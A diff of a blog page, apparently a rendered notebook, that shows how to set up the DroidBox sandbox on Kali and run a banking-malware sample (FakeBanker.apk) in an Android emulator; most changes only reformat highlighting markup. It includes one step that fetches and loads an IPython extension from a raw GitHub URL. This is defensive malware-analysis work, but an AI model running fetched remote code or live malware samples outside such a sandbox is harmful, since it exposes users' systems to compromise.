@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -153,15 +153,15 @@
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>First you'll have to install some requirements DroidBox needs. First make sure you have the system relevant packages installed:</p>
-<pre><code class="language-shell">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># apt-get install python-virtualenv libatlas-dev liblapack-dev libblas-dev</span>
-</code></pre>
+<div class="highlight"><pre><span></span>root@kali:~# apt-get install python-virtualenv libatlas-dev liblapack-dev libblas-dev
+</pre></div>
 <p>You'll need those in order to use <code>scipy</code>, <code>matplotlib</code> and <code>numpy</code> along with Droidbox. Now create a virtual environment and install <em>python</em> dependencies:</p>
-<pre><code class="language-shell">root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><span class="comment"># mkdir env</span>
-root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><span class="comment"># virtualenv env</span>
+<div class="highlight"><pre><span></span>root@kali:~/work/apk# mkdir env
+root@kali:~/work/apk# virtualenv env
 ...
-root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><span class="comment"># source env/bin/activate</span>
-(env)root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><span class="comment"># pip install numpy scipy matplotlib</span>
-</code></pre>
+root@kali:~/work/apk# <span class="nb">source</span> env/bin/activate
+<span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk# pip install numpy scipy matplotlib
+</pre></div>
 </div>
 </div>
 </div>
@@ -180,8 +180,8 @@ root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><s
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>Download the package:</p>
-<pre><code class="language-shell">(env)root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><span class="comment"># wget https://droidbox.googlecode.com/files/DroidBox411RC.tar.gz</span>
-</code></pre>
+<div class="highlight"><pre><span></span><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk# wget https://droidbox.googlecode.com/files/DroidBox411RC.tar.gz
+</pre></div>
 </div>
 </div>
 </div>
@@ -196,21 +196,21 @@ root<span class="variable">@kali</span><span class="symbol">:~/work/apk</span><s
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [2]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="kn">import</span> <span class="nn">os</span>
+<div class="prompt input_prompt">In [2]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
-<span class="c"># Setup new PATH</span>
-<span class="n">old_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'PATH'</span><span class="p">]</span>
-<span class="n">new_path</span> <span class="o">=</span> <span class="n">old_path</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="s">"/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0"</span>
-<span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'PATH'</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_path</span>
+<span class="c1"># Setup new PATH</span>
+<span class="n">old_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">'PATH'</span><span class="p">]</span>
+<span class="n">new_path</span> <span class="o">=</span> <span class="n">old_path</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="s2">"/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0"</span>
+<span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">'PATH'</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_path</span>
 
-<span class="c"># Change working directory</span>
-<span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">"/root/work/apk/DroidBox_4.1.1/"</span><span class="p">)</span>
+<span class="c1"># Change working directory</span>
+<span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s2">"/root/work/apk/DroidBox_4.1.1/"</span><span class="p">)</span>
 </pre></div>
+</div>
 </div>
 </div>
 </div>
@@ -225,38 +225,38 @@ In [2]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [415]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%</span><span class="k">pylab</span> <span class="n">inline</span>
+<div class="prompt input_prompt">In [415]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">%</span><span class="k">pylab</span> inline
 <span class="kn">import</span> <span class="nn">binascii</span>
-<span class="kn">import</span> <span class="nn">pandas</span> <span class="kn">as</span> <span class="nn">pd</span>
-<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
-<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="kn">as</span> <span class="nn">plt</span>
-<span class="kn">import</span> <span class="nn">networkx</span> <span class="kn">as</span> <span class="nn">nx</span>
-<span class="kn">import</span> <span class="nn">datetime</span> <span class="kn">as</span> <span class="nn">dt</span>
+<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
+<span class="kn">import</span> <span class="nn">networkx</span> <span class="k">as</span> <span class="nn">nx</span>
+<span class="kn">import</span> <span class="nn">datetime</span> <span class="k">as</span> <span class="nn">dt</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">ipy_table</span>
-<span class="kn">from</span> <span class="nn">IPython.display</span> <span class="kn">import</span> <span class="n">display_pretty</span><span class="p">,</span> <span class="n">display_html</span><span class="p">,</span> <span class="n">display_jpeg</span><span class="p">,</span> <span class="n">display_png</span><span class="p">,</span> <span class="n">display_json</span><span class="p">,</span> <span class="n">display_latex</span><span class="p">,</span> <span class="n">display_svg</span>
-<span class="kn">from</span> <span class="nn">IPython.display</span> <span class="kn">import</span> <span class="n">HTML</span>
-<span class="kn">from</span> <span class="nn">IPython.core.magic</span> <span class="kn">import</span> <span class="n">register_cell_magic</span><span class="p">,</span> <span class="n">Magics</span><span class="p">,</span> <span class="n">magics_class</span><span class="p">,</span> <span class="n">cell_magic</span>
+<span class="kn">from</span> <span class="nn">IPython.display</span> <span class="k">import</span> <span class="n">display_pretty</span><span class="p">,</span> <span class="n">display_html</span><span class="p">,</span> <span class="n">display_jpeg</span><span class="p">,</span> <span class="n">display_png</span><span class="p">,</span> <span class="n">display_json</span><span class="p">,</span> <span class="n">display_latex</span><span class="p">,</span> <span class="n">display_svg</span>
+<span class="kn">from</span> <span class="nn">IPython.display</span> <span class="k">import</span> <span class="n">HTML</span>
+<span class="kn">from</span> <span class="nn">IPython.core.magic</span> <span class="k">import</span> <span class="n">register_cell_magic</span><span class="p">,</span> <span class="n">Magics</span><span class="p">,</span> <span class="n">magics_class</span><span class="p">,</span> <span class="n">cell_magic</span>
 <span class="kn">import</span> <span class="nn">jinja2</span>
 
-<span class="c"># Ipython settings</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.height'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.max_rows'</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.max_columns'</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.max_colwidth'</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.width'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
-<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s">'display.column_space'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
+<span class="c1"># Ipython settings</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.height'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.max_rows'</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.max_columns'</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.max_colwidth'</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.width'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
+<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.column_space'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Populating the interactive namespace from numpy and matplotlib
 height has been deprecated.
 
@@ -277,22 +277,22 @@ height has been deprecated.
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [5]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Install</span>
-<span class="o">%</span><span class="k">install_ext</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dorneanu</span><span class="o">/</span><span class="n">ipython</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">extensions</span><span class="o">/</span><span class="n">diagmagic</span><span class="o">.</span><span class="n">py</span>
+<div class="prompt input_prompt">In [5]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="c1"># Install</span>
+<span class="o">%</span><span class="k">install_ext</span> https://raw.githubusercontent.com/dorneanu/ipython/master/extensions/diagmagic.py
     
-<span class="c"># Then load extensions</span>
-<span class="o">%</span><span class="k">load_ext</span> <span class="n">diagmagic</span>
+<span class="c1"># Then load extensions</span>
+<span class="o">%</span><span class="k">load_ext</span> diagmagic
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Installed diagmagic.py. To use it, type:
   %load_ext diagmagic
 </pre>
@@ -312,12 +312,10 @@ In [5]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [416]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="kn">from</span> <span class="nn">IPython</span> <span class="kn">import</span> <span class="n">display</span>
+<div class="prompt input_prompt">In [416]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="kn">from</span> <span class="nn">IPython</span> <span class="kn">import</span> <span class="n">display</span>
 <span class="kn">from</span> <span class="nn">IPython.core.magic</span> <span class="kn">import</span> <span class="n">register_cell_magic</span><span class="p">,</span> <span class="n">Magics</span><span class="p">,</span> <span class="n">magics_class</span><span class="p">,</span> <span class="n">cell_magic</span>
 <span class="kn">import</span> <span class="nn">jinja2</span>
 
@@ -325,18 +323,18 @@ In [416]:
     <span class="sd">""" Outputs a DataFrame as a table using ipy_table """</span>
     <span class="n">entries</span> <span class="o">=</span> <span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">df</span><span class="o">.</span><span class="n">itertuples</span><span class="p">()]</span>
     
-    <span class="c"># Extract table header</span>
+    <span class="c1"># Extract table header</span>
     <span class="n">header</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">df</span><span class="o">.</span><span class="n">columns</span><span class="p">)</span>
     
-    <span class="c"># Add index to header</span>
+    <span class="c1"># Add index to header</span>
     <span class="n">header</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">df</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
     
-    <span class="c"># Insert header at 1st place</span>
+    <span class="c1"># Insert header at 1st place</span>
     <span class="n">entries</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">header</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">ipy_table</span><span class="o">.</span><span class="n">make_table</span><span class="p">(</span><span class="n">entries</span><span class="p">)</span>
 
-<span class="c"># Create jinja cell magic (http://nbviewer.ipython.org/urls/gist.github.com/bj0/5343292/raw/23a0845ee874827e3635edb0bf5701710a537bfc/jinja2.ipynb)</span>
+<span class="c1"># Create jinja cell magic (http://nbviewer.ipython.org/urls/gist.github.com/bj0/5343292/raw/23a0845ee874827e3635edb0bf5701710a537bfc/jinja2.ipynb)</span>
 <span class="nd">@magics_class</span>
 <span class="k">class</span> <span class="nc">JinjaMagics</span><span class="p">(</span><span class="n">Magics</span><span class="p">):</span>
     <span class="sd">'''Magics class containing the jinja2 magic and state'''</span>
@@ -344,11 +342,11 @@ In [416]:
     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">shell</span><span class="p">):</span>
         <span class="nb">super</span><span class="p">(</span><span class="n">JinjaMagics</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
         
-        <span class="c"># create a jinja2 environment to use for rendering</span>
-        <span class="c"># this can be modified for desired effects (ie: using different variable syntax)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="n">FileSystemLoader</span><span class="p">(</span><span class="s">'.'</span><span class="p">))</span>
+        <span class="c1"># create a jinja2 environment to use for rendering</span>
+        <span class="c1"># this can be modified for desired effects (ie: using different variable syntax)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="n">FileSystemLoader</span><span class="p">(</span><span class="s1">'.'</span><span class="p">))</span>
         
-        <span class="c"># possible output types</span>
+        <span class="c1"># possible output types</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">display_functions</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">html</span><span class="o">=</span><span class="n">display</span><span class="o">.</span><span class="n">HTML</span><span class="p">,</span> 
                                       <span class="n">latex</span><span class="o">=</span><span class="n">display</span><span class="o">.</span><span class="n">Latex</span><span class="p">,</span>
                                       <span class="n">json</span><span class="o">=</span><span class="n">display</span><span class="o">.</span><span class="n">JSON</span><span class="p">,</span>
@@ -368,7 +366,7 @@ In [416]:
         
         <span class="n">tmp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">cell</span><span class="p">)</span>
         <span class="n">rend</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="nb">dict</span><span class="p">((</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">shell</span><span class="o">.</span><span class="n">user_ns</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> 
-                                        <span class="k">if</span> <span class="ow">not</span> <span class="n">k</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'_'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">shell</span><span class="o">.</span><span class="n">user_ns_hidden</span><span class="p">))</span>
+                                        <span class="k">if</span> <span class="ow">not</span> <span class="n">k</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">'_'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">shell</span><span class="o">.</span><span class="n">user_ns_hidden</span><span class="p">))</span>
         
         <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="n">rend</span><span class="p">)</span>
         
@@ -394,26 +392,26 @@ In [416]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>Now you'll have to install an Android device virtually in order to analyze the APK. Supposing you have installed the SDK in the previous step now you should have some <em>targets</em> available on your machine. If not (that was my case) then make sure you have a X session running and run <code>android</code> from the console. In my case I've fired up <code>vnc</code> and connected to the Kali machine. </p>
+<p>Now you'll have to install an Android device virtually in order to analyze the APK. Supposing you have installed the SDK in the previous step now you should have some <em>targets</em> available on your machine. If not (that was my case) then make sure you have a X session running and run <code>android</code> from the console. In my case I've fired up <code>vnc</code> and connected to the Kali machine.</p>
 <p>This is what I've got:</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [22]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">android</span> <span class="nb">list</span> <span class="n">targets</span> <span class="o">|</span> <span class="n">head</span> <span class="o">-</span><span class="n">n</span> <span class="mi">10</span>
+<div class="prompt input_prompt">In [22]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+android list targets <span class="p">|</span> head -n 10
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Available Android targets:
 ----------
 id: 1 or "android-16"
@@ -444,26 +442,25 @@ with the following hardware config:
 hw.lcd.density=240
 hw.ramSize=512
 hw.sdCard=yes
-vm.heapSize=48
-</code></pre>
+vm.heapSize=48</code></pre>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [14]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">android</span> <span class="nb">list</span> <span class="n">avd</span>
+<div class="prompt input_prompt">In [14]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+android list avd
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Available Android Virtual Devices:
     Name: android-4.1.2-droidbox
     Path: /root/.android/avd/android-4.1.2-droidbox.avd
@@ -497,19 +494,19 @@ In [14]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [5]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">cat</span> <span class="n">startemu</span><span class="o">.</span><span class="n">sh</span>
+<div class="prompt input_prompt">In [5]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+cat startemu.sh
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">#!/usr/bin/env bash
 
 emulator -avd $1 -system images/system.img -ramdisk images/ramdisk.img -wipe-data -prop dalvik.vm.execution-mode=int:portable &amp;
@@ -525,9 +522,9 @@ emulator -avd $1 -system images/system.img -ramdisk images/ramdisk.img -wipe-dat
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>Afterwards make sure you have a X session and <strong>run</strong> the emulator with your previously created AVD:</p>
-<pre><code class="language-shell">(env)root@kali:~/work/apk/DroidBox<span class="comment"># ./startemu.sh android-4.1.2-droidbox</span>
-<span class="keyword">...</span>
-</code></pre>
+<div class="highlight"><pre><span></span><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/DroidBox# ./startemu.sh android-4.1.2-droidbox
+...
+</pre></div>
 </div>
 </div>
 </div>
@@ -551,22 +548,22 @@ emulator -avd $1 -system images/system.img -ramdisk images/ramdisk.img -wipe-dat
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [10]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>./droidbox.sh /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk
+<div class="prompt input_prompt">In [10]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>./droidbox.sh /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
-<pre class="ipynb">[H[2J ____                        __  ____
+<div class="output_subarea output_stream output_stdout output_text">
+<pre class="ipynb"> ____                        __  ____
 /\  _`\               __    /\ \/\  _`\
 \ \ \/\ \  _ __  ___ /\_\   \_\ \ \ \L\ \   ___   __  _
- \ \ \ \ \/\`&amp;apos;__\ __`\/\ \  /&amp;apos;_` \ \  _ &lt;&amp;apos; / __`\/\ \/&amp;apos;\
+ \ \ \ \ \/\`'__\ __`\/\ \  /'_` \ \  _ &lt;' / __`\/\ \/'\
   \ \ \_\ \ \ \/\ \L\ \ \ \/\ \L\ \ \ \L\ \ \L\ \/&gt;  &lt;/
    \ \____/\ \_\ \____/\ \_\ \___,_\ \____/ \____//\_/\_\
     \/___/  \/_/\/___/  \/_/\/__,_ /\/___/ \/___/ \//\/_/
@@ -588,8 +585,7 @@ Analyzing the application during infinite time seconds...
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<blockquote>
-<p>DroidBox will then listen for activities until you kill it by ^C. </p>
+<blockquote><p>DroidBox will then listen for activities until you kill it by ^C.</p>
 </blockquote>
 </div>
 </div>
@@ -602,8 +598,7 @@ Analyzing the application during infinite time seconds...
 <p>Meanwhile I was interacting with the APP and saw that DroidBox was collecting the logs during the interacttions.
 DroidBox will output its results as a JSON file. <strong>I've uploaded the results to <a href="http://pastebin.com/7YSb3EMW">pastebin.com</a></strong>. Now let's have some fun and take a look at the results.</p>
 <p>Before starting analyzing the output keep in mind that:</p>
-<blockquote>
-<p>[...] all data received/sent, read/written are shown in hexadecimal since the handled data can contain binary data. </p>
+<blockquote><p>[...] all data received/sent, read/written are shown in hexadecimal since the handled data can contain binary data.</p>
 <p>(Source: <a href="https://github.com/floe/mobile-sandbox/blob/master/DroidBox_4.1.1/scripts/droidbox.py">https://github.com/floe/mobile-sandbox/blob/master/DroidBox_4.1.1/scripts/droidbox.py</a>)</p>
 </blockquote>
 </div>
@@ -629,20 +624,18 @@ DroidBox will output its results as a JSON file. <strong>I've uploaded the resul
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [27]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="kn">import</span> <span class="nn">json</span>
+<div class="prompt input_prompt">In [27]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">urllib</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s">"http://pastebin.com/raw.php?i=7YSb3EMW"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://pastebin.com/raw.php?i=7YSb3EMW"</span>
 
-<span class="c"># Load data</span>
+<span class="c1"># Load data</span>
 <span class="n">jsonurl</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 <span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">jsonurl</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
 
-<span class="c"># Show dictionary keys</span>
+<span class="c1"># Show dictionary keys</span>
 <span class="n">result</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
 </pre></div>
 </div>
@@ -650,24 +643,25 @@ In [27]:
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[27]:</div>
-<pre class="ipynb">[u&amp;apos;apkName&amp;apos;,
- u&amp;apos;enfperm&amp;apos;,
- u&amp;apos;opennet&amp;apos;,
- u&amp;apos;cryptousage&amp;apos;,
- u&amp;apos;sendsms&amp;apos;,
- u&amp;apos;servicestart&amp;apos;,
- u&amp;apos;sendnet&amp;apos;,
- u&amp;apos;closenet&amp;apos;,
- u&amp;apos;accessedfiles&amp;apos;,
- u&amp;apos;fdaccess&amp;apos;,
- u&amp;apos;dataleaks&amp;apos;,
- u&amp;apos;recvnet&amp;apos;,
- u&amp;apos;dexclass&amp;apos;,
- u&amp;apos;hashes&amp;apos;,
- u&amp;apos;recvsaction&amp;apos;,
- u&amp;apos;phonecalls&amp;apos;]</pre>
+<div class="output_area"><div class="prompt output_prompt">Out[27]:</div>
+<div class="output_text output_subarea output_execute_result">
+<pre class="ipynb">[u'apkName',
+ u'enfperm',
+ u'opennet',
+ u'cryptousage',
+ u'sendsms',
+ u'servicestart',
+ u'sendnet',
+ u'closenet',
+ u'accessedfiles',
+ u'fdaccess',
+ u'dataleaks',
+ u'recvnet',
+ u'dexclass',
+ u'hashes',
+ u'recvsaction',
+ u'phonecalls']</pre>
+</div>
 </div>
 </div>
 </div>
@@ -701,38 +695,35 @@ In [27]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [421]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert timestamps to human readable time delta</span>
-<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'fdaccess'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
+<div class="prompt input_prompt">In [421]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Convert timestamps to human readable time delta</span>
